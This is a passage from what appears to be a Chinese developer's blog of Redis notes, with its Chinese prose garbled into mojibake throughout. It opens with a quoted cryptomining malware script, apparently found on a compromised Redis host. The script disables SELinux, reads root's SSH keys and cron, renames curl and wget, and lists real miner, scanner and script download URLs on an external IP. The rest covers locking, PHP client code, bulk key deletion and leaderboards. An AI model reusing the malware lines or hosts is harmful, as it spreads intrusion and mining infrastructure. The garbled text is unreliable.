ç­‰å‘½ä»¤å¾—äº†ä¸€äº›è„šæœ¬</span></span><br><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">setenforce <span class="number">0</span> <span class="number">2</span>&gt;dev/<span class="literal">null</span></span><br><span class="line">echo SELINUX=disabled &gt; <span class="regexp">/etc/</span>sysconfig/selinux <span class="number">2</span>&gt;<span class="regexp">/dev/</span><span class="literal">null</span></span><br><span class="line">sync &amp;&amp; echo <span class="number">3</span> &gt;<span class="regexp">/proc/</span>sys/vm/drop_caches</span><br><span class="line">crondir=<span class="string">'/var/spool/cron/'</span><span class="string">"$USER"</span></span><br><span class="line">cont=<span class="string">`cat <span class="subst">$&#123;crondir&#125;</span>`</span></span><br><span class="line">ssht=<span class="string">`cat /root/.ssh/authorized_keys`</span></span><br><span class="line">echo <span class="number">1</span> &gt; <span class="regexp">/etc/</span>sysupdates</span><br><span class="line">rtdir=<span class="string">"/etc/sysupdates"</span></span><br><span class="line">bbdir=<span class="string">"/usr/bin/curl"</span></span><br><span class="line">bbdira=<span class="string">"/usr/bin/cur"</span></span><br><span class="line">ccdir=<span class="string">"/usr/bin/wget"</span></span><br><span class="line">ccdira=<span class="string">"/usr/bin/wge"</span></span><br><span class="line">mv /usr/bin/wget /usr/bin/get</span><br><span class="line">mv /usr/bin/xget /usr/bin/get</span><br><span class="line">mv /usr/bin/get /usr/bin/wge</span><br><span class="line">mv /usr/bin/curl /usr/bin/url</span><br><span class="line">mv /usr/bin/xurl /usr/bin/url</span><br><span class="line">mv /usr/bin/url /usr/bin/cur</span><br><span class="line">miner_url=<span class="string">"https://pixeldrain.com/api/download/Y0o4foA1"</span></span><br><span class="line">miner_url_backup=<span class="string">"http://198.13.42.229:8667/6HqJB0SPQqbFbHJD/sysupdate"</span></span><br><span class="line">miner_size=<span class="string">"854364"</span></span><br><span class="line">sh_url=<span class="string">"http://198.13.42.229:8667/6HqJB0SPQqbFbHJD/update.sh"</span></span><br><span class="line">sh_url_backup=<span class="string">"http://198.13.42.229:8667/6HqJB0SPQqbFbHJD/update.sh"</span></span><br><span class="line">config_url=<span class="string">"http://198.13.42.229:8667/6HqJB0SPQqbFbHJD/config.json"</span></span><br><span class="line">config_url_backup=<span class="string">"http://198.13.42.229:8667/6HqJB0SPQqbFbHJD/config.json"</span></span><br><span class="line">config_size=<span class="string">"3300"</span></span><br><span class="line">scan_url=<span class="string">"https://pixeldrain.com/api/download/OMKMU5Td"</span></span><br><span class="line">scan_url_backup=<span class="string">"http://198.13.42.229:8667/6HqJB0SPQqbFbHJD/networkservice"</span></span><br><span class="line">scan_size=<span class="string">"2584064"</span></span><br><span class="line"></span><br><span class="line">https:<span class="comment">//www.freebuf.com/vuls/148758.html  æŸ¥çœ‹çº¿ä¸Šç¯å¢ƒæ˜¯å¦ä½¿ç”¨äº† redis-weui äº†</span></span><br></pre></td></tr></table></figure>
<h3 id="åŠ é”å’Œè§£é”é—®é¢˜"><a href="#åŠ é”å’Œè§£é”é—®é¢˜" class="headerlink" title="åŠ é”å’Œè§£é”é—®é¢˜"></a>åŠ é”å’Œè§£é”é—®é¢˜</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ($redis-&gt;set(<span class="string">'my:lock'</span>, <span class="number">1</span>, [<span class="string">'NX'</span>])) &#123;</span><br><span class="line">        # todo</span><br><span class="line"></span><br><span class="line">        $redis-&gt;del(<span class="string">'my:lock'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">å…¶ä¸­NX â€” è¡¨ç¤ºåªæœ‰keyä¸å­˜åœ¨çš„æ—¶å€™æ‰è®¾ç½®https:<span class="comment">//shuwoom.com/?p=2833</span></span><br><span class="line"><span class="keyword">if</span> ($redis-&gt;set(<span class="string">'my:lock'</span>, <span class="number">1</span>, [<span class="string">'NX'</span>, <span class="string">'EX'</span> =&gt; <span class="number">10</span>])) &#123;</span><br><span class="line">        # todo</span><br><span class="line"></span><br><span class="line">        $redis-&gt;del(<span class="string">'my:lock'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    åŸå­æ€§é—®é¢˜è€Œé¢ä¸´ä¸Šé¢åŒæ ·çš„é—®é¢˜ã€‚æ‰€ä»¥è¿™é‡Œè¦ç”¨åˆ°luaè„šæœ¬æ¥è§£å†³ã€‚</span><br><span class="line">    </span><br><span class="line">        $script = <span class="string">'</span></span><br><span class="line"><span class="string">    if redis.call("get",KEYS[1]) == ARGV[1]</span></span><br><span class="line"><span class="string">    then</span></span><br><span class="line"><span class="string">        return redis.call("del",KEYS[1])</span></span><br><span class="line"><span class="string">    else</span></span><br><span class="line"><span class="string">        return 0</span></span><br><span class="line"><span class="string">    end</span></span><br><span class="line"><span class="string">        '</span>;</span><br><span class="line">        $token = uniqid(mt_rand(), <span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">if</span> ($redis-&gt;set(<span class="string">'my:lock'</span>, $token, [<span class="string">'NX'</span>, <span class="string">'EX'</span> =&gt; <span class="number">10</span>])) &#123;</span><br><span class="line">            # todo</span><br><span class="line">    </span><br><span class="line">            $redis-&gt;<span class="built_in">eval</span>($script, [<span class="string">"my:lock"</span>, $token], <span class="number">1</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            echo <span class="string">'get lock failed!'</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<h3 id="php-redis"><a href="#php-redis" class="headerlink" title="php redis"></a>php redis</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    $redis = <span class="keyword">new</span> Redis();</span><br><span class="line">    $redis-&gt;connect('127.0.0.1', 6379, 1); # çŸ­è¿æ¥ï¼Œè¶…è¿‡1ç§’æ”¾å¼ƒè¿æ¥https://shuwoom.com/?p=2786</span><br><span class="line"><span class="comment">//    $redis-&gt;open('127.0.0.1', 6379, 1); # åŒä¸Š</span></span><br><span class="line"><span class="comment">//    $redis-&gt;pconnect('127.0.0.1', 6379, 1); # é•¿è¿æ¥ï¼Œè¶…è¿‡1ç§’æ”¾å¼ƒè¿æ¥</span></span><br><span class="line">    $redis-&gt;popen('127.0.0.1', 6379, 1); # åŒä¸Š</span><br><span class="line"></span><br><span class="line">    # ç™»å½•éªŒè¯å¯†ç ï¼Œè¿”å›ï¼štrueæˆ–false</span><br><span class="line">    <span class="keyword">if</span> ($redis-&gt;auth(<span class="string">'password'</span>)) &#123;</span><br><span class="line">        echo <span class="string">'auth success!'</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        echo <span class="string">'auth failed!'</span>;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> Exception(<span class="string">'Redis auth failed!'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $redis-&gt;select(0); # é€‰æ‹©redisåº“ï¼Œ0~15ï¼Œå…±16ä¸ªåº“</span><br><span class="line">    $redis-&gt;close(); # é‡Šæ”¾èµ„æº</span><br><span class="line"><span class="comment">//    $redis-&gt;ping(); # æ£€æŸ¥æ˜¯å¦è¿˜åœ¨è¿æ¥</span></span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception $e) &#123;</span><br><span class="line">    var_dump($e-&gt;getMessage());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="å¸¸ç”¨å‘½ä»¤"><a href="#å¸¸ç”¨å‘½ä»¤" class="headerlink" title="å¸¸ç”¨å‘½ä»¤"></a>å¸¸ç”¨å‘½ä»¤</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">ping pingæˆ‘ä»¬çš„ä¸»æœºèƒ½å¦é“¾æ¥ é“¾æ¥æ˜¯å¦å­˜æ´»</span><br><span class="line">echo å‘½ä»¤ echo demoç›´æ¥è¾“å‡º</span><br><span class="line">select é€‰æ‹©æ•°æ®åº“ select <span class="number">0</span><span class="number">-16</span>ä¸ªæ•°æ®åº“</span><br><span class="line">quit exit é€€å‡ºé“¾æ¥</span><br><span class="line">dbsize è¿”å›æ•°æ®åº“çš„é”®çš„ä¸ªæ•°</span><br><span class="line">info è¿”å›æœåŠ¡å™¨ç›¸å…³ä¿¡æ¯</span><br><span class="line">config get è¿”å›æœåŠ¡é…ç½®ä¿¡æ¯</span><br><span class="line">flush db æ¸…ç©ºæ•°æ®åº“</span><br><span class="line">flushall åˆ é™¤æ‰€æœ‰æ•°æ®åº“ä¸­æ‰€æœ‰çš„é”®</span><br><span class="line">Key-values</span><br><span class="line">keys * åŒ¹é…é”®æ‰€æœ‰çš„é”®. æ¨¡ç³ŠåŒ¹é… keys my* å–å‡ºæ‰€æœ‰å·²myå¼€å¤´çš„é”®</span><br><span class="line">exists åˆ¤æ–­æ˜¯å¦é”® exists nameåˆ¤æ–­æ˜¯å¦æœ‰nameè¿™ä¸ªé”®æ˜¯å¦å­˜åœ¨</span><br><span class="line">del åˆ é™¤é”® del name åˆ é™¤nameçš„é”®</span><br><span class="line">expire è®¾ç½®è¿‡æœŸæ—¶é—´ expire key time</span><br><span class="line">ttl key æŸ¥çœ‹é”®çš„è¿‡æœŸæ—¶é—´</span><br><span class="line">select database é€‰æ‹©æ•°æ®åº“</span><br><span class="line">move key dababase1 è®²keyç§»åŠ¨dao database1ä¸­çš„æ•°æ®åº“ä¸­</span><br><span class="line">persist å–æ¶ˆé”®çš„è¿‡æœŸæ—¶é—´</span><br><span class="line">randomkey éšæœºè¿”å›ä¸€ä¸ªé”®çš„å€¼</span><br><span class="line">rename é‡å‘½åä¸€ä¸ªé”®</span><br><span class="line">type key åˆ¤æ–­keyçš„æ•°æ®ç±»å‹</span><br><span class="line">æ‰¹é‡åˆ é™¤ <span class="number">0</span>å·æ•°æ®åº“ä¸­åç§°å«æœ‰OMP_OFFLINEçš„keyï¼š</span><br><span class="line"></span><br><span class="line">src/redis-cli -n <span class="number">0</span> keys <span class="string">"*OMP_OFFLINE*"</span>|xargs src/redis-cli -n <span class="number">0</span> del</span><br><span class="line">åœ¨redisçš„å®¢æˆ·ç«¯ç¯å¢ƒä¸­å¹¶ä¸æ”¯æŒæ‰¹é‡åˆ é™¤ã€‚</span><br><span class="line"></span><br><span class="line">å¯ä»¥æŠŠæŸä¸ªkeysçš„ç»“æœå…¨éƒ¨è¾“å‡ºåˆ°æ–‡ä»¶ä¸­ï¼Œæ¯”å¦‚keys.log</span><br><span class="line"></span><br><span class="line">redis-cli -p port -c command &gt; keys.log</span><br><span class="line">https:<span class="comment">//anttutu.github.io/2017/06/redis/</span></span><br></pre></td></tr></table></figure>
<h3 id="æ‰¹é‡åˆ é™¤redisçš„key"><a href="#æ‰¹é‡åˆ é™¤redisçš„key" class="headerlink" title="æ‰¹é‡åˆ é™¤redisçš„key"></a>æ‰¹é‡åˆ é™¤redisçš„key</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h host -p <span class="number">6379</span> -a pwd -n <span class="number">15</span> --scan --pattern <span class="string">'exchange*'</span> | xargs <span class="number">-0</span> -n <span class="number">5000</span> redis-cli -h host -a pwd -p <span class="number">6379</span> -n <span class="number">15</span> DEL</span><br><span class="line">-h ä½ çš„redisæœåŠ¡å™¨åœ°å€</span><br><span class="line">-p ç«¯å£ é»˜è®¤<span class="number">6379</span></span><br><span class="line">-a å¯†ç </span><br><span class="line">-n é€‰æ‹©rediså¯¹åº”çš„db</span><br><span class="line"></span><br><span class="line">xargså‚æ•°:</span><br><span class="line">-n æŒ‰æ¯nä¸ªä¸ºä¸€ç»„è¾“å‡ºå‚æ•°ï¼Œå¦‚æœredisçš„Keyæ•°é‡å¤§çš„è¯å¯ä»¥å¢åŠ æ­¤å‚æ•°,å¦åˆ™ä¼šæŠ¥é”™ argument list too long</span><br><span class="line"><span class="number">-0</span> å½“keyè¿˜æœ‰å¼•å·ç­‰ç‰¹æ®Šå­—ç¬¦,åŠ æ­¤å‚æ•°å¯ä»¥å±è”½,ä½¿ç‰¹æ®Šå­—ç¬¦å¤±æ•ˆ,ä¸åŠ ä¼šæŠ¥é”™:</span><br><span class="line">https:<span class="comment">//segmentfault.com/a/1190000016717860</span></span><br><span class="line">æ¯æ¬¡æ‰«<span class="number">10</span>æ¡ redis-cli  --scan --pattern <span class="string">'app:uid:reg:date:707*'</span>|xargs -n <span class="number">10</span> redis-cli mget</span><br><span class="line"></span><br><span class="line">ç™»å½•redisé€šè¿‡infoæŸ¥çœ‹ï¼Œå†…å­˜ä½¿ç”¨<span class="number">25</span>Gå¤šï¼Œè€ŒKEYä¹Ÿæœ‰<span class="number">1.44</span>äº¿äº†ã€‚ã€‚ã€‚REIDSä¸­æœ‰å¤§é‡æ— ç”¨è€Œåˆæœªè®¾ç½®è¿‡æœŸæ—¶é—´çš„KEYå­˜åœ¨ã€‚è®¾ç½®ä¸ªè¿‡æœŸæ—¶é—´ï¼Œä¸¾æ‰‹ä¹‹åŠ³çš„äº‹ï¼Œè¿˜æ˜¯æœ‰å¿…è¦çš„ã€‚</span><br><span class="line"></span><br><span class="line">used_memory_human:<span class="number">24.72</span>G</span><br><span class="line">db0:keys=<span class="number">144856453</span>,expires=<span class="number">25357</span></span><br><span class="line">é€šè¿‡æµ‹è¯•æœºæ‰§è¡Œ keys prefix* å¯¼è‡´REDISå¡æ­»ï¼Œå…¶ä»–è¿æ¥ä¹Ÿè¿ä¸ä¸Šã€‚æ‰€ä»¥å®šä½åˆ°é—®é¢˜å‡ºç°åœ¨keyså‘½ä»¤ä¸Šï¼Œä¹Ÿæ­£å¦‚æ‰‹å†Œä¸Šè¯´çš„é€ æˆæ€§èƒ½é—®é¢˜ã€‚</span><br><span class="line"></span><br><span class="line">å¦‚ä½•åˆ é™¤æœªç”¨åˆ°çš„KEYï¼Ÿ</span><br><span class="line"></span><br><span class="line">å¤§éƒ¨åˆ†KEYæ˜¯æœ‰è§„å¾‹çš„ï¼Œæœ‰ç‰¹å®šå‰ç¼€ï¼Œéœ€è¦æ‹¿åˆ°ç‰¹å®šå‰ç¼€çš„KEYç„¶ååˆ é™¤ï¼Œç½‘ä¸Šæœ‰è¿™æ ·çš„å‘½ä»¤ï¼š</span><br><span class="line"></span><br><span class="line">redis-cli -a redis-pwd -n <span class="number">0</span> keys <span class="string">"preffix*"</span> | xargs redis-cli -p <span class="number">6379</span> -a redis-pwd -n <span class="number">0</span> del</span><br><span class="line">æµ‹è¯•æœºæ‰§è¡Œkeys â€œpreffix<span class="number">-1</span>*â€œæ—¶é—´å¤§æ¦‚<span class="number">40</span>å¤šsï¼Œè¿™æ„å‘³ç€redisè¦åœ<span class="number">40</span>s+ï¼Œè€Œå‰ç¼€æ˜¯æŒ‰å¤©è®¾ç½®çš„ï¼Œè¿™æ ·å­éœ€è¦æ“ä½œå¤šæ¬¡ï¼Œå› ä¸ºä¸šåŠ¡çš„åŸå› ï¼Œä¸å…è®¸è¿™ä¹ˆæ“ä½œï¼Œåˆ†åˆ†é’Ÿéƒ½æ˜¯é’±~æœ€åæƒ³åˆ°çš„åŠæ³•æ˜¯å…ˆä»æµ‹è¯•æœºä¸ŠæŠŠæ»¡è¶³æ¡ä»¶çš„keyå¯¼åˆ°æ–‡æœ¬ï¼Œå‰é¢çš„è¯­å¥é€šè¿‡catæ–‡æœ¬å»æ‹¿ã€‚å¦‚ï¼š</span><br><span class="line"></span><br><span class="line">redis-cli -p <span class="number">6380</span> -a redis-pwd keys <span class="string">"preffix-1*"</span> &gt; <span class="regexp">/home/</span>keys_redis/preffix<span class="number">-1</span></span><br><span class="line">ç„¶åé€šè¿‡è¿™äº›æ•°æ®åˆ æ‰ç”Ÿäº§ç¯å¢ƒä¸Šçš„keyã€‚</span><br><span class="line"></span><br><span class="line">cat /home/keys_redis/preffix<span class="number">-1</span> | xargs redis-cli -a redis-pwd -n <span class="number">0</span> del</span><br><span class="line">åˆ é™¤çš„é€Ÿåº¦éå¸¸å¿«ï¼Œå†…å­˜è€—çš„ä¹ŸæŒºå¿«ï¼Œæ„Ÿè§‰åƒæ˜¯æœ‰å¤šå°‘è€—å¤šå°‘çš„ã€‚æ‰§è¡Œä¹‹åKEYçš„æ•°é‡å‡å°‘äº†<span class="number">95</span>%+ï¼Œå†…å­˜ä¹Ÿä»<span class="number">25</span>Gé™åˆ°äº†<span class="number">2</span>Gã€‚ä¸è¿‡æœ‰ä¸€ä¸ªæŒ‡æ•°å‡é«˜ï¼šmem_fragmentation_ratioï¼Œå‰åçš„memoryå¯¹æ¯”ï¼š</span><br><span class="line"></span><br><span class="line"># Memory å¤„ç†å‰</span><br><span class="line">used_memory:<span class="number">26839186032</span></span><br><span class="line">used_memory_human:<span class="number">25.00</span>G</span><br><span class="line">used_memory_rss:<span class="number">23518339072</span></span><br><span class="line">used_memory_peak:<span class="number">26963439000</span></span><br><span class="line">used_memory_peak_human:<span class="number">25.11</span>G</span><br><span class="line">used_memory_lua:<span class="number">31744</span></span><br><span class="line">mem_fragmentation_ratio:<span class="number">0.88</span></span><br><span class="line">mem_allocator:jemalloc<span class="number">-3.2</span><span class="number">.0</span></span><br><span class="line"></span><br><span class="line"># Memory å¤„ç†å</span><br><span class="line">used_memory:<span class="number">2399386704</span></span><br><span class="line">used_memory_human:<span class="number">2.23</span>G</span><br><span class="line">used_memory_rss:<span class="number">4621533184</span></span><br><span class="line">used_memory_peak:<span class="number">26963439000</span></span><br><span class="line">used_memory_peak_human:<span class="number">25.11</span>G</span><br><span class="line">used_memory_lua:<span class="number">31744</span></span><br><span class="line">mem_fragmentation_ratio:<span class="number">1.93</span></span><br><span class="line">mem_allocator:jemalloc<span class="number">-3.2</span><span class="number">.0</span></span><br><span class="line"></span><br><span class="line">https:<span class="comment">//itopic.org/redis-delete-keys.html</span></span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$redis = <span class="keyword">new</span> Redis();</span><br><span class="line"><span class="comment">//è®¾ç½®æ‰©å±•åœ¨ä¸€æ¬¡scanæ²¡æœ‰æŸ¥æ‰¾å‡ºè®°å½•æ—¶ è¿›è¡Œé‡å¤çš„scan ç›´åˆ°æŸ¥è¯¢å‡ºç»“æœæˆ–è€…éå†ç»“æŸä¸ºæ­¢</span></span><br><span class="line">$redis-&gt;setOption(Redis::OPT_SCAN, <span class="attr">Redis</span>::SCAN_RETRY);</span><br><span class="line"></span><br><span class="line">$match = <span class="string">'foo:*'</span>;</span><br><span class="line">$count = <span class="number">10000</span>;</span><br><span class="line">$it=<span class="literal">null</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//è¿™ç§ç”¨æ³•ä¸‹æˆ‘ä»¬åªéœ€è¦ç®€å•åˆ¤æ–­è¿”å›ç»“æœæ˜¯å¦ä¸ºç©ºå³å¯, å¦‚æœä¸ºç©ºè¯´æ˜éå†ç»“æŸ</span></span><br><span class="line"><span class="keyword">while</span> ($keys = $redis-&gt;scan($it, $match, $count)) &#123;</span><br><span class="line">    $redis-&gt;del($keys);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">åœ¨åˆ é™¤çš„åŒæ—¶æ³¨æ„ç›‘æ§å†…å­˜å˜åŒ–æƒ…å†µï¼Œå°±èƒ½ç¡®è®¤é—®é¢˜äº†ï¼š</span><br><span class="line"></span><br><span class="line">shell&gt; watch -d -n <span class="number">1</span> <span class="string">'/path/to/redis-cli info | grep memory'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* è®¾ç½®éå†çš„ç‰¹æ€§ä¸ºä¸é‡å¤æŸ¥æ‰¾ï¼Œè¯¥æƒ…å†µä¸‹æ‰©å±•åªä¼šscanä¸€æ¬¡ï¼Œæ‰€ä»¥å¯èƒ½ä¼šè¿”å›ç©ºé›†åˆ */</span></span><br><span class="line">$redis-&gt;setOption(Redis::OPT_SCAN, <span class="attr">Redis</span>::SCAN_NORETRY);</span><br><span class="line"> </span><br><span class="line">$it = NULL;</span><br><span class="line">$pattern = <span class="string">'*'</span>;</span><br><span class="line">$count = <span class="number">50</span>;  <span class="comment">// æ¯æ¬¡éå†50æ¡ï¼Œæ³¨æ„æ˜¯éå†50æ¡ï¼Œéå†å‡ºæ¥çš„50æ¡keyè¿˜è¦å»åŒ¹é…ä½ çš„æ¨¡å¼ï¼Œæ‰€ä»¥å¹¶ä¸ç­‰äºå°±èƒ½å¤Ÿå–å‡º50æ¡key</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">    $keysArr = $redis-&gt;scan($it, $pattern, $count);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> ($keysArr)</span><br><span class="line">    &#123;</span><br><span class="line">        foreach ($keysArr <span class="keyword">as</span> $key)</span><br><span class="line">        &#123;</span><br><span class="line">            echo $key . <span class="string">"\n"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125; <span class="keyword">while</span> ($it &gt; <span class="number">0</span>);   <span class="comment">//æ¯æ¬¡è°ƒç”¨ Scanä¼šè‡ªåŠ¨æ”¹å˜ $it å€¼ï¼Œå½“$it = 0æ—¶ è¿™æ¬¡éå†ç»“æŸ é€€å‡ºå¾ªç¯</span></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">https:<span class="comment">//blog.csdn.net/zhang197093/article/details/74615717</span></span><br><span class="line">https:<span class="comment">//blog.huoding.com/2014/04/11/343</span></span><br></pre></td></tr></table></figure>
<h3 id="æœ‰åºé›†åˆå®ç°-24-å°æ—¶æ’è¡Œæ¦œå®æ—¶æ›´æ–°"><a href="#æœ‰åºé›†åˆå®ç°-24-å°æ—¶æ’è¡Œæ¦œå®æ—¶æ›´æ–°" class="headerlink" title="æœ‰åºé›†åˆå®ç° 24 å°æ—¶æ’è¡Œæ¦œå®æ—¶æ›´æ–°"></a>æœ‰åºé›†åˆå®ç° 24 å°æ—¶æ’è¡Œæ¦œå®æ—¶æ›´æ–°</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">åˆ©ç”¨ ZADD æŒ‰å°æ—¶åˆ’åˆ†æ·»åŠ ç”¨æˆ·çš„ç§¯åˆ†ä¿¡æ¯ï¼Œç„¶åç”¨ ZUNIONSTORE å¹¶é›†å®ç° <span class="number">24</span> å°æ—¶çš„æ¸¸æˆç§¯åˆ†æ€»å’Œï¼Œå®ç° â€œ<span class="number">24</span> å°æ—¶æ’è¡Œæ¦œâ€ï¼›</span><br><span class="line"></span><br><span class="line">   ZUNIONSTORE destination numkeys key [key ...]</span><br><span class="line">    Redis Zunionstore å‘½ä»¤è®¡ç®—ç»™å®šçš„ä¸€ä¸ªæˆ–å¤šä¸ªæœ‰åºé›†çš„å¹¶é›†ï¼Œå…¶ä¸­ç»™å®š key çš„æ•°é‡å¿…é¡»ä»¥ numkeys å‚æ•°æŒ‡å®šï¼Œå¹¶     å°†è¯¥å¹¶é›†(ç»“æœé›†)å‚¨å­˜åˆ° destination ã€‚</span><br><span class="line">    é»˜è®¤æƒ…å†µä¸‹ï¼Œç»“æœé›†ä¸­æŸä¸ªæˆå‘˜çš„åˆ†æ•°å€¼æ˜¯æ‰€æœ‰ç»™å®šé›†ä¸‹è¯¥æˆå‘˜åˆ†æ•°å€¼ä¹‹å’Œ ã€‚</span><br><span class="line">    </span><br><span class="line">    Redis åœ¨é‡åˆ°åˆ†æ•°ç›¸åŒæ—¶æ˜¯æŒ‰ç…§é›†åˆæˆå‘˜è‡ªèº«çš„å­—å…¸é¡ºåºæ¥æ’åºï¼Œè¿™é‡Œå³æ˜¯æŒ‰ç…§â€user2â€³å’Œâ€user3â€³è¿™ä¸¤ä¸ªå­—ç¬¦ä¸²è¿›è¡Œæ’åºï¼Œä»¥é€†åºæ’åºçš„è¯ user3 è‡ªç„¶æ’åˆ°äº†å‰é¢ã€‚è¦è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬å¯ä»¥è€ƒè™‘åœ¨åˆ†æ•°ä¸­åŠ å…¥æ—¶é—´æˆ³ï¼Œè®¡ç®—å…¬å¼ä¸ºï¼š</span><br><span class="line">    å¸¦æ—¶é—´æˆ³çš„åˆ†æ•° = å®é™…åˆ†æ•°*<span class="number">10000000000</span> + (<span class="number">9999999999</span> â€“ timestamp) </span><br><span class="line">    https:<span class="comment">//learnku.com/articles/30279</span></span><br></pre></td></tr></table></figure>
<h3 id="ä¸»ä»é…ç½®"><a href="#ä¸»ä»é…ç½®" class="headerlink" title="ä¸»ä»é…ç½®"></a>ä¸»ä»é…ç½®</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span 